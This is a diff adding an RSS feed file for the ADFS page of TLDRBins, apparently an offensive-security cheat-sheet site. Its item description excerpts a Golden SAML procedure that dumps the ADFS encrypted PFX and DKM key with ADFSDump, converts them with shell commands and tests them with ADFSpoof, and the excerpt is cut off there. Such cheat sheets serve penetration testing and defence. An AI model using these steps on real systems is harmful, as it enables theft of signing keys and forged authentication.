@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>ADFS on TLDRBins</title>
+    <link>https://tldrbins.github.io/@adfs/</link>
+    <description>Recent content in ADFS on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@adfs/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>ADFS</title>
+      <link>https://tldrbins.github.io/adfs/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/adfs/</guid>
+      <description>Abuse #1: Generate a SAML 2.0 token for some app Windows 1. Dump encrypted PFX and DKM key # With ADFS service account .\ADFSDump.exe Ref: ADFSDump&#xA;2. Convert to binary blob # Copy private key(s) echo &amp;#39;&amp;lt;PRIVATE_KEY&amp;gt;&amp;#39; | sed &amp;#39;s/-//g&amp;#39; | xxd -r -p &amp;gt; DkmKey.bin # Copy Encrypted Token Signing Key Begin ... Encrypted Token Signing Key End cat b64_blob | base64 -d &amp;gt; EncryptedPfx.bin 3. Check which private key is correct # The correct key will not show error python ADFSpoof.</description>
+    </item>
+  </channel>
+</rss>
